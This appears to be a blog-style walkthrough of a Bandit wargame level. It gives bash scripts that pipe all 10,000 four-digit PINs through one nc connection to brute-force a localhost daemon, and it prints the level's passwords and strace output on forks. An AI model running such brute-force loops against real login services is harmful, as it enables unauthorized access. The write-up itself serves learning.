---
date: '2026-09-15'
description: daemon? demon? dodge srt?!
draft: false
title: bandit-24
weight: 25
---

| info | value                                      |
|:-----|-------------------------------------------:|
| user | `bandit24`                                   |
| pass | `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`         |

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

---

## explanation

another script to construct yay :D

firstly let's see how the daemon handles input after establishing a connection

```sh
nc localhost 30002
# I am the pincode checker for user bandit25. Please enter the password
# for user bandit24 and the secret pincode on a single line, separated by a space.
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 6969
# Wrong! Please enter the correct current password and pincode. Try again.
```

bash is somewhat straight forward, a little bit of python, seasoned with bbq <or insert your favorite flavor here> - if i had to make an analogy

so constructing a loop is as easy as `for i in {start..stop}; do ... done`, let's do that then while also applying a filter for messages we don't want to see ("Wrong"). this can be achieved with [`grep -v`](https://askubuntu.com/questions/1153513/what-does-grep-v-grep-mean-and-do#answer-1153520) to invert the match

```sh
#!/usr/bin/env bash

PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in {0000..9999}; do
  echo "$PASS $i" # as requested by the daemon
done | nc localhost 30002 | grep -v Wrong
```

`nc` is deliberately **not** constructed inside the loop, - putting it there would open a fresh connection per guess (basically 10,000 handshakes). kept outside, `nc` runs once & the for loop's output streams through the pipe into the single process, meaning all guesses ride over one singular tcp connection

> i hope that was somewhat understandable

```sh
# Correct!
# The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

---

### for the nerds


```sh
#!/usr/bin/env bash

PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
grep -v Wrong <<<"$(nc localhost 30002 <<<"$(printf "$PASS %04d\n" {0..9999})")"
```

the inner [here-string](https://tecadmin.net/bash-here-strings/) (`<<<`) feeds the generated guess into `nc` & sends its output captured by `$(..)`

finally, the outer here-string feeds that into the inverted grep match

> basically like math, starting from the inner most parentheses

although there are still [forks](https://stackoverflow.com/questions/18760891/please-explain-fork#answer-18770480) (the `$()` part), avoiding pipes isn't inherently bad, just a nice way to see different ways achieving the same result

an (**almost**) forkless version could look like this

```sh
#!/usr/bin/env bash

PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

printf -v payload "$PASS %04d\n" {0..9999}
resp=$(nc localhost 30002 <<<"$payload") # unavoidable
while IFS= read -r line; do
  [[ $line == *Wrong* ]] || echo "$line"
done <<<"$resp"
```

convince yourself, the command below will return `<command> is a shell builtin` except for `nc`

```sh
type -a printf echo nc
```

if you still don't believe me (i had fun researching lol), below are two examples of printing "hi" to stdout, one with a here-string & one with a fork

```sh
strace -f -e trace=clone,fork,vfork,execve \
bash -c 'while read -r line; do :; done <<< "hi"' # here-string

execve("/usr/bin/bash", ["bash", "-c", "while read -r line; do :; done <"...],
  0x7ffc3ee9da08 /* 51 vars */) = 0
+++ exited with 0 +++

# now compared to a fork which would call `clone(..)` specifically
strace -f -e trace=clone,fork,vfork,execve \
bash -c 'x=$(echo hi)' # fork

execve("/usr/bin/bash", ["bash", "-c", "x=$(echo hi)"],
  0x7ffe74d43918 /* 51 vars */) = 0
#vvvv
clone(child_stack=NULL,
#^^^^
  flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLDstrace:
  Process 17960 attached, child_tidptr=0x7d4669c08a10) = 17960
[pid 17960] +++ exited with 0 +++
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED,
  si_pid=17960, si_uid=1001, si_status=0, si_utime=0,
  si_stime=0} ---
+++ exited with 0 +++
```

in all honesty, all versions have about the same runtime +-0.05ms difference give or take, but for larger projects, please consider avoiding forks & external calls wherever possible!
